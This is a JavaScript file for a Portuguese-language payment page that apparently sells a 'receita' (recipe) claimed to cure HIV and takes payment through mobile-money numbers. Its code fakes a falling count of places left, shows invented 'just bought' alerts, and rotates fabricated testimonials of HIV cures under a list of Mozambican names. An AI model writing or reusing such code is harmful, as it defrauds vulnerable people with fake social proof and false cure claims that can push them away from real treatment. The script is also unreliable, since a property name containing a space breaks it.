// ===== TEU CÓDIGO ORIGINAL =====
let currentStep = 1;
let vagas = 18;

const nome = document.getElementById("nome");
const telefone = document.getElementById("telefone");

function irPara(step){
document.querySelector(".step.active").classList.remove("active");
document.getElementById("step"+step).classList.add("active");
currentStep = step;
}

function voltar(step){
irPara(step);
}

document.getElementById("btnStep1").addEventListener("click",()=>{
let valido = true;

if(nome.value.trim()===""){
document.getElementById("nomeErro").innerText="Informe o nome";
valido=false;
}else{
document.getElementById("nomeErro").innerText="";
}

if(!/^[0-9]{9}$/.test(telefone.value)){
document.getElementById("telErro").innerText="Número deve ter 9 dígitos";
valido=false;
navigator.vibrate(200);
}else{
document.getElementById("telErro").innerText="";
}

if(valido){
irPara(2);
}
});

let totalTime=600;
let timerEl=document.getElementById("timer");
let progressEl=document.getElementById("progress");

let countdown=setInterval(()=>{
let min=Math.floor(totalTime/60);
let sec=totalTime%60;
timerEl.innerText=`${min}:${sec<10?"0":""}${sec}`;
progressEl.style.width=((600-totalTime)/600)*100+"%";
totalTime--;
if(totalTime<0)clearInterval(countdown);
},1000);

document.querySelectorAll(".payment-btn").forEach(btn=>{
btn.addEventListener("click",()=>{
let type=btn.dataset.type;
let info=document.getElementById("paymentInfo");

if(type==="mpesa"){
info.innerHTML="<p>844598917 - CELESTE NHACHOTA</p><p>Digite *150# para pagar</p>";
}else{
info.innerHTML="<p>867145774 - CELESTE NHACHOTA</p><p>Digite *898# para pagar</p>";
}

irPara(3);
});
});

document.getElementById("copiarBtn").addEventListener("click",()=>{
let texto=document.getElementById("paymentInfo").innerText;
navigator.clipboard.writeText(texto);
mostrarToast("Copiado com sucesso");
document.getElementById("processingInfo").classList.remove("hidden");

setTimeout(()=>{
document.getElementById("confirmBtn").classList.remove("hidden");
},15000);
});

document.getElementById("confirmBtn").addEventListener("click",()=>{
let verify=document.getElementById("verifyProgress");
let width=0;
let interval=setInterval(()=>{
width+=5;
verify.style.width=width+"%";
if(width>=100){
clearInterval(interval);
window.location.href="https://wa.me/25884598917";
}
},150);
});

function mostrarToast(msg){
let toast=document.getElementById("toast");
toast.innerText=msg;
toast.style.display="block";
setTimeout(()=>{toast.style.display="none"},2000);
}

// ===== SISTEMA DE VAGAS ATUALIZADO =====
setInterval(() => {
    if(vagas > 3) {
        if(vagas > 10) {
            vagas -= 2;
        } else if(vagas > 6) {
            vagas -= 1;
        } else {
            vagas -= 1;
        }
        
        if(vagas < 3) vagas = 3;
        
        document.getElementById("vagas").innerText = vagas;
        
        const vagasElement = document.getElementById("vagas");
        if(vagas <= 5) {
            vagasElement.style.color = "#ef4444";
            vagasElement.style.animation = "pulse 1s infinite";
        } else if(vagas <= 8) {
            vagasElement.style.color = "#f97316";
        } else {
            vagasElement.style.color = "#facc15";
        }
    }
}, 8000);

// ===== NOTIFICAÇÕES DE COMPRA =====
setInterval(() => {
    if(vagas > 3) {
        const nomesCompradores = [
            "Amélia", "Bernardo", "Cecília", "Dércio", "Ernesto", 
            "Francisca", "Gildo", "Helena", "Inácio", "Júlia"
        ];
        const nome = nomesCompradores[Math.floor(Math.random() * nomesCompradores.length)];
        mostrarNotificacaoCompra(`${nome} comprou agora 🔥`);
        
        if(navigator.vibrate) {
            navigator.vibrate(50);
        }
    }
}, 12000);

function mostrarNotificacaoCompra(mensagem) {
    let notifDiv = document.getElementById("notifications");
    let notif = document.createElement("div");
    notif.className = "notification";
    notif.innerText = mensagem;
    notifDiv.appendChild(notif);
    
    setTimeout(() => {
        notif.remove();
    }, 4000);
}

// ===== NOVO COMPONENTE DE NOTIFICAÇÕES =====
class NotificacoesAoVivo {
    constructor() {
        this.container = document.getElementById('notificacoesMensagens');
        this.maxComentarios = 3; // Só 3 comentários por vez
        this.comentariosAtivos = [];
        this.nomesUsados = []; // Controla nomes já usados na sessão
        
        // 50 NOMES MOÇAMBICANOS AUTÊNTICOS (sem repetição)
        this.nomesMocambicanos = [
            // Nomes femininos
            "Joana Alice", "Martinha Simbine", "Celeste Nhachota", "Arminda Tembe", "Esperança Bié",
            "Felismina Chaúque", "Gertrudes Macamo", "Inácia Matsinhe", "Lucrécia Uamusse", "Olinda Guambe",
            "Paulina Sitoe", "Sónia Mabjaia", "Virgínia Machava", "Amélia Nkosi", "Cecília Chilundo",
            "Rosa Muianga", "Helena Nhampossa", "Fátima Langa", "Tereza Macuácua", "Luísa Cossa",
            "Albertina Zandamela", "Angelina Mafumo", "Benta Nhaca", "Carlota Mondlane", "Delfina Mabote",
            
            // Nomes masculinos
            "Otall Smih", "Cremildo Langa", "Horácio Nhampossa", "Jeremias Cossa", "Marcelino Nhantumbo",
            "Nelson Macuácua", "Rafael Mondlane", "Tomás Zandamela", "Wilson Nhaca", "Xavier Muianga",
            "Zacarias Tembe", "Bernardo Mafumo", "Dércio Machava", "Ernesto Guambe", "Francisco Uamusse",
            "Gildo Matsinhe", "Hélder Sitoe", "Ivan Chaúque", "João Tembe", "Kevin Mabjaia",
            "Lázaro Bié", "Manuel Nhachota", "Orlando Simbine", "Pascoal Macamo", "Salvador Nkosi"
        ];
        
        // Mensagens CURTAS sobre o HIV/SIDA (máximo 8 palavras)
        this.mensagens Curtas = [
            "Testei negativo! 🙏",
            "Funcionou comigo!",
            "30 dias negativo!",
            "Curado graças a Deus",
            "Receita poderosa",
            "Funcionou mesmo!",
            "Estou curado! 🔥",
            "Recomendo a todos",
            "Já testei e deu certo",
            "Milagre aconteceu",
            "Funcionou pra mim",
            "Negativo no médico",
            "Receita aprovada",
            "Valeu a pena",
            "Estou livre do HIV",
            "Funcionou 100%",
            "Já estou curado",
            "Testei ontem: negativo",
            "Funciona mesmo!",
            "Cura confirmada",
            "Obrigado pela receita",
            "Deu certo aqui",
            "Receita salvou-me",
            "Estou curado! 🙌",
            "Negativo após 30 dias"
        ];
        
        this.init();
    }
    
    init() {
        // Começa com alguns comentários
        this.adicionarComentarioInicial();
        
        // A cada 6-10 segundos, muda um comentário
        setInterval(() => {
            this.rotacionarComentarios();
        }, this.getIntervaloAleatorio(6000, 10000));
    }
    
    getIntervaloAleatorio(min, max) {
        return Math.floor(Math.random() * (max - min + 1) + min);
    }
    
    getNomeNaoUsado() {
        // Filtra nomes ainda não usados na sessão
        const nomesDisponiveis = this.nomesMocambicanos.filter(nome => !this.nomesUsados.includes(nome));
        
        // Se todos nomes já foram usados, limpa o histórico
        if(nomesDisponiveis.length === 0) {
            this.nomesUsados = [];
            return this.nomesMocambicanos[Math.floor(Math.random() * this.nomesMocambicanos.length)];
        }
        
        const nomeEscolhido = nomesDisponiveis[Math.floor(Math.random() * nomesDisponiveis.length)];
        this.nomesUsados.push(nomeEscolhido);
        return nomeEscolhido;
    }
    
    adicionarComentarioInicial() {
        const comentariosIniciais = [
            "Testei negativo depois de 48 dias",
            "Receita cura mesmo, funcionou",
            "30 dias negativo no médico"
        ];
        
        for(let i = 0; i < 3; i++) {
            this.adicionarComentario(
                this.getNomeNaoUsado(),
                comentariosIniciais[i]
            );
        }
    }
    
    rotacionarComentarios() {
        // Remove o comentário mais antigo
        if(this.comentariosAtivos.length >= this.maxComentarios) {
            this.comentariosAtivos.shift();
        }
        
        // Adiciona um novo comentário
        const nomeNovo = this.getNomeNaoUsado();
        const mensagemNova = this.mensagens Curtas[Math.floor(Math.random() * this.mensagens Curtas.length)];
        
        this.comentariosAtivos.push({
            nome: nomeNovo,
            mensagem: mensagemNova,
            tempo: this.getTempoRelativo(),
            id: Date.now() + Math.random()
        });
        
        this.renderizar();
    }
    
    adicionarComentario(nome, mensagem) {
        this.comentariosAtivos.push({
            nome: nome,
            mensagem: mensagem,
            tempo: this.getTempoRelativo(),
            id: Date.now() + Math.random()
        });
        
        this.renderizar();
    }
    
    getTempoRelativo() {
        const tempos = [
            "agora", "há 1 min", "há 2 min", "há 5 min",
            "há 10 min", "há 15 min", "há 30 min"
        ];
        return tempos[Math.floor(Math.random() * tempos.length)];
    }
    
    renderizar() {
        if (!this.container) return;
        
        let html = '';
        // Mostra apenas os últimos 3 comentários
        const comentariosParaMostrar = this.comentariosAtivos.slice(-3);
        
        comentariosParaMostrar.forEach(com => {
            html += `
                <div class="notificacao-item" style="animation: fadeInUp 0.5s ease-out;">
                    <div class="notificacao-nome">${com.nome}</div>
                    <div class="notificacao-texto">${com.mensagem}</div>
                    <div class="notificacao-tempo">${com.tempo}</div>
                </div>
            `;
        });
        
        this.container.innerHTML = html;
    }
}

// Inicializa
document.addEventListener('DOMContentLoaded', () => {
    new NotificacoesAoVivo();
});
